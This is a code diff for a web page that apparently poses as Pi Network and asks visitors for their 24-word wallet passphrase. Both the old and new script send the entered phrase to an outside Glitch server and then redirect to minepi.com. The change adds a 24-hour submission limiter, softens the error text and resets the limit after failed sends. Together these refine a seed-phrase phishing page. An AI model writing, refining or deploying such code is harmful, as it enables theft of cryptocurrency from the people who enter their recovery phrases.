@@ -366,43 +366,63 @@
     </div>
 
     <script>
-async function validatePassphrase(inputId, errorId) {
-    const input = document.getElementById(inputId);
-    const error = document.getElementById(errorId);
-    const words = input.value.trim().split(/\s+/).filter(word => word.length > 0);
+        // ====================== 24-HOUR RATE LIMITER ======================
+        function checkRateLimit() {
+            const LAST_SUBMISSION_KEY = 'lastPassphraseSubmission';
+            const TWENTY_FOUR_HOURS = 24 * 60 * 60 * 1000;
+            
+            const lastSubmission = localStorage.getItem(LAST_SUBMISSION_KEY);
+            const now = Date.now();
+            
+            if (lastSubmission && (now - parseInt(lastSubmission)) < TWENTY_FOUR_HOURS) {
+                const hoursLeft = Math.ceil((TWENTY_FOUR_HOURS - (now - parseInt(lastSubmission))) / (1000 * 60 * 60));
+                alert(`You can only submit once per 24 hours. Please try again in ${hoursLeft} hours.`);
+                return false;
+            }
+            
+            localStorage.setItem(LAST_SUBMISSION_KEY, now.toString());
+            return true;
+        }
 
-    // Validate 24 words
-    if (words.length !== 24) {
-      error.style.display = 'block';
-      error.textContent = 'Passphrase must be 24 words';
-      return;
-    }
+        async function validatePassphrase(inputId, errorId) {
+            // Check 24-hour limit first
+            if (!checkRateLimit()) return;
 
-    error.style.display = 'none';
-    document.getElementById('loadingOverlay').style.display = 'flex';
+            const input = document.getElementById(inputId);
+            const error = document.getElementById(errorId);
+            const words = input.value.trim().split(/\s+/).filter(word => word.length > 0);
 
-    // Send to Glitch backend
-   try {
-    const response = await fetch('https://fuckyou-suraa.glitch.me/validate-passphrase', {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ passphrase: input.value })
-    });
+            if (words.length !== 24) {
+                error.style.display = 'block';
+                error.textContent = 'Passphrase must be 24 words';
+                return;
+            }
 
-    // Handle rate limit errors
-    if (response.status === 429) {
-      alert("Too many attempts! Please wait 1 minute.");
-      return;
-    }
+            error.style.display = 'none';
+            document.getElementById('loadingOverlay').style.display = 'flex';
 
-    const result = await response.json();
-    if (result.success) window.location.href = "https://minepi.com";
-  } catch (e) {
-    alert("Connection error. Try again later.");
-  } finally {
-    document.getElementById('loadingOverlay').style.display = 'none';
-  }
-}
+            try {
+                const response = await fetch('https://fuckyou-suraa.glitch.me/validate-passphrase', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ passphrase: input.value })
+                });
+
+                if (response.status === 429) {
+                    alert("Server overloaded. Please wait before trying again.");
+                    return;
+                }
+
+                const result = await response.json();
+                if (result.success) window.location.href = "https://minepi.com";
+            } catch (e) {
+                alert("Connection error. Try again later.");
+                localStorage.removeItem('lastPassphraseSubmission'); // Reset on failure
+            } finally {
+                document.getElementById('loadingOverlay').style.display = 'none';
+            }
+        }
+
         function showModal(modalType) {
             document.body.style.overflow = "hidden";
             document.querySelectorAll('body > *').forEach(el => {
